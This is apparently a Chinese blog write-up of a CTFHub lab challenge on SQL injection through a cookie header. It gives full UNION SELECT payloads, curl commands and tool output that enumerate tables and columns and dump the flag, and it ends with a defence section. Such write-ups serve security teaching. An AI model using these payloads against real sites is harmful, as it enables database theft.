---
layout: post
title: CTFHub - SQL Cookie 注入 Writeup
platform: ctfhub
date: 2026-10-21 19:57:00 +0800
categories: CTF
---

CTFHub - SQL Cookie 注入 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → Cookie 注入）
- 题型：Web
- 考点：**注入点在 Cookie**、URL 编码、UNION 联合查询


```text
页面标题：CTFHub 技能学习 | Cookie注入
页面提示：这次的输入点变了。尝试找找Cookie吧

★ 首页的响应头里就给了线索：
    Set-Cookie: id=1
    Set-Cookie: hint=id输入1试试？          （URL 解码后）

★ GET 请求加 ?id=1 完全没用（页面不显示任何数据）
  但带上 Cookie: id=1 就出结果：

    Cookie: id=1
    → <code>select * from news where id=1</code>
       ID: 1
       Data: ctfhub

★ Cookie 里的 payload 是可以直接放空格的（服务端会 URL 解码）：
    原样    Cookie: id=0 union select 1,2
    URL 编码 Cookie: id=0%20union%20select%201,2
    两种都有效

★ 又是随机表名/字段名：

    表名   : eixjjmazvt, news
    字段名 : sqli:eixjjmazvt:zbfzhduwrm
             sqli:news:id
             sqli:news:data

    news 表的数据：id = 1,2,114514     data = ctfhub,skill,sqli

★ 最终 payload：

    Cookie: id=0 union select 1,group_concat(zbfzhduwrm) from eixjjmazvt
    → Data: ctfhub{e4a265addee9eba89e0f7037}

flag         : ctfhub{e4a265addee9eba89e0f7037}
```

二、题目分析

**① 什么是 Cookie 注入**

```text
普通的注入把 payload 放在 URL 参数里：
    /?id=1 union select ...

Cookie 注入把 payload 放在【Cookie 请求头】里：
    Cookie: id=1 union select ...

因为在后端代码里，取值方式变了：

    普通：$id = $_GET['id'];
    Cookie：$id = $_COOKIE['id'];      ← ★ 换成从 Cookie 取

但危险的是 —— 后面的代码还是老样子：
    $sql = "select * from news where id=$id";    ← 照样直接拼接
```

**★ 核心认知：注入点位置变了，但漏洞本质没变**

```
只要"用户可控的输入"被直接拼进 SQL，就有注入
不管这个输入来自 GET、POST、Cookie、User-Agent、Referer
```

**② 怎么发现注入点在 Cookie**

**线索 1：页面提示**

```text
这次的输入点变了。尝试找找Cookie吧
                       └──────┬──────┘
                          直接告诉你了
```

**线索 2：响应头里有 Set-Cookie**

```text
HTTP/1.1 200 OK
Set-Cookie: id=1
Set-Cookie: hint=id输入1试试？
```

**★ `id=1` 这个 Cookie 就是注入点** —— 服务器主动把 `id` 设成 1，说明它要用这个值。

**线索 3：`?id=1` 没反应，但 Cookie 有效**

```
GET /?id=1                    → 页面什么都没有
GET /  + Cookie: id=1         → ID: 1  Data: ctfhub
```

**③ Cookie 值的编码问题（重要细节）**

```text
Cookie 的语法规定：值里不能有空格、分号、逗号等字符

    Cookie: id=0 union select 1,2
                  └─┬─┘
              这里有空格 → 严格来说不合规范

所以在浏览器里（开发者工具的 Console / 编辑 Cookie）会被自动编码，
手动用 curl / 脚本发的时候可以：
    · 直接发（很多服务器容忍）
    · 或者 URL 编码：id=0%20union%20select%201,2
```

**★ 服务端会自动 URL 解码**：

```php
$_COOKIE['id'] 的值是自动解码后的
→ 你发 %20，PHP 拿到的是空格
→ 所以编码与否都能用
```

**④ 和整数型注入的关系**

| | 整数型注入 | Cookie 注入（本题） |
|---|---|---|
| 注入位置 | URL 参数 `?id=` | **Cookie 头 `id=`** |
| SQL 形式 | `where id=1` | `where id=1`（一样） |
| 检测工具 | 浏览器地址栏/Burp | Burp / 开发者工具 |
| payload | `0 union select ...` | `0 union select ...`（一样）|
| **区别** | — | **改的是 Cookie 而不是 URL** |

**所以这题除了"payload 放哪"以外，和整数型完全一样。**

三、解题步骤

**方法一：浏览器 + 开发者工具（最直观）**

**第 1 步：确认注入点在 Cookie**

```
① 打开题目地址
    http://challenge-xxx:10800/
② 按 F12 打开开发者工具
③ 切到 【Application】（应用）→ 左侧 【Cookies】
④ 看到有个 cookie 叫 id，值是 1
⑤ 同时在 【Network】（网络）里刷新页面，看响应头：
       Set-Cookie: id=1
```

**第 2 步：改 Cookie 试注入**

```
① 在 【Console】（控制台）里执行：
       document.cookie = "id=0 union select 1,2"
② 刷新页面
③ 页面显示：ID: 1  Data: 2        ← ★ 成功了
```

**如果控制台改 Cookie 不生效**（有些 cookie 带 HttpOnly），用 **Burp**：

```
① Burp → Proxy → Intercept on
② 浏览器访问首页，请求被拦住
③ 在请求头里找到 Cookie: id=1
④ 改成 Cookie: id=0 union select 1,2
⑤ Forward
⑥ 页面显示 ID: 1  Data: 2
```

**第 3 步：探字段数**

```
Cookie: id=0 union select 1,2      → ID: 1  Data: 2     ✅
Cookie: id=0 union select 1,2,3    → 空白（列数不对）
→ 字段数 = 2
```

**第 4 步：爆库名**

```
Cookie: id=0 union select 1,database()
→ Data: sqli
```

**第 5 步：爆表名**

```
Cookie: id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
→ Data: eixjjmazvt,news
       └────┬────┘
    随机表名（目标）
```

**第 6 步：爆字段名**

```
Cookie: id=0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
→ Data: sqli:eixjjmazvt:zbfzhduwrm,sqli:news:id,sqli:news:data
                  └────┬────┘ └────┬────┘
                   表名随机     字段名随机
```

**第 7 步：拿 flag**

```
Cookie: id=0 union select 1,group_concat(zbfzhduwrm) from eixjjmazvt
→ Data: ctfhub{e4a265addee9eba89e0f7037}
```

---

**方法二：curl 命令行**

```bash
BASE="http://challenge-xxx:10800"

# 正常请求
curl -s -H "Cookie: id=1" "$BASE/"

# 注入：库名
curl -s -H "Cookie: id=0 union select 1,database()" "$BASE/"

# 注入：表名
curl -s -H "Cookie: id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()" "$BASE/"

# URL 编码写法（等价）
curl -s -H "Cookie: id=0%20union%20select%201,database()" "$BASE/"
```

---

**方法三：用工具一键跑**

```text
双击 sqli-cookie.bat
→ 粘贴地址 http://challenge-xxx:10800/
→ Cookie 名：直接回车（默认 id）
→ 是否字符型：N
```

**工具实测输出**：

```text
④ 爆表名
  table_schema=database()  -> eixjjmazvt,news

⑤ 爆字段名
  表 eixjjmazvt   字段: zbfzhduwrm
  表 news         字段: id,data

⑥ 爆数据，找 flag
  SELECT group_concat(zbfzhduwrm) FROM eixjjmazvt
     -> ctfhub{e4a265addee9eba89e0f7037}

★ FLAG: ctfhub{e4a265addee9eba89e0f7037}
```

四、延伸知识

**① 注入点的位置可以有很多种（"注入点全家桶"）**

| 位置 | 后端取值方式 | 怎么测 |
|---|---|---|
| GET 参数 | `$_GET['id']` | 改 URL |
| POST 参数 | `$_POST['id']` | 改表单 |
| **Cookie** | `$_COOKIE['id']` | 改 Cookie 头 |
| **User-Agent** | `$_SERVER['HTTP_USER_AGENT']` | 改 UA 头 |
| **Referer** | `$_SERVER['HTTP_REFERER']` | 改 Referer 头 |
| **X-Forwarded-For** | `$_SERVER['HTTP_X_FORWARDED_FOR']` | 改 XFF 头 |
| 文件路径 | 文件名拼进 SQL | 改上传文件名 |

**★ 实战排查顺序**：

```
URL 参数没反应 → 试 POST → 试 Cookie → 试 UA → 试 Referer → 试 XFF
```

**② 为什么 CTFHub 要单独出一关 Cookie 注入**

```text
目的：打破"只盯 URL 参数"的思维定式

很多人第一次做题时会想：
    "?id=1 没反应，是不是没注入？"

但实际上输入点可能在任何"用户可控的地方"。
★ 这一步是思维训练，不是技术差异。
```

**③ Cookie 注入的 payload 编码注意**

```text
Cookie 语法里，这些字符需要编码：
    空格  → %20
    分号  → %3B      （分号是 cookie 分隔符，必须编码）
    逗号  → %2C
    等号  → %3D

★ 但服务端 PHP 的 $_COOKIE 会自动 URL 解码
  → 你发 %20，代码里拿到的是空格

实践中：
    · 浏览器开发者工具 / Burp 会自动处理
    · 脚本里建议显式编码，避免歧义
```

**④ 这题我踩到的一个"解析 bug"（值得记录）**

```text
工具第一次跑，字段名抓成了 bfzhduwrm
                                  ↑
                          正确是 zbfzhduwrm（少了个 z）

原因：
    我的提取算法是"拿一个标记字符串的响应，和目标响应做前后缀对比"
        ref = "ID: zzQqMarkZz Data:"
        got = "ID: zbfzhduwrm Data:"

    两者公共前缀是 "ID: z"（因为标记也以 z 开头！）
    → 开头的 z 被当成"公共部分"吃掉了
    → 提取出 "bfzhduwrm"

修复：
    改成【模板匹配】—— 把 ref 里的标记替换成捕获组 (.*?)
        ^ID: (.*?) Data:$
    用它去匹配 got → 精确捕获中间的完整值

★ 教训：用"前后缀对比"提取数据是脆弱的，
  一旦数据恰好和标记共享字符就会出错。
  用模板/正则捕获才可靠。
```

**⑤ 防护**

```text
· ★ 参数化查询（根本办法）—— 不管输入来自哪里都安全
· 不要信任任何"用户可控"的数据：
    GET / POST / Cookie / Header / 文件名
· Cookie 加 HttpOnly（防 XSS 偷 Cookie，但不防服务端拼接注入）
· 输入校验
· 最小权限数据库账号
```

五、总结

- **本题核心：注入点从 URL 参数变成了 Cookie，但漏洞原理和 payload 完全一样。**
- 三步确认 Cookie 注入：

```text
① 看响应头有没有 Set-Cookie: id=1（服务器主动设的 cookie 往往是注入点）
② ?id=1 没反应，但 Cookie: id=1 有数据
③ 改 Cookie 为 id=0 union select 1,2 → 页面显示 1 和 2 → 确认注入
```

- 完整 payload（放在 Cookie 头里）：

```text
Cookie: id=0 union select 1,database()
Cookie: id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
Cookie: id=0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
Cookie: id=0 union select 1,group_concat(zbfzhduwrm) from eixjjmazvt
```

- **三个必记要点**：

```text
① 注入点可以在任何"用户可控输入"里：URL / POST / Cookie / UA / Referer / XFF
② Cookie 值里的空格等特殊字符建议 URL 编码（服务端会自动解码）
③ 提取数据时用【模板/正则捕获】，别用"前后缀对比"——
   数据恰好和标记共享字符时会截错（我这次就丢了开头的 z）
```
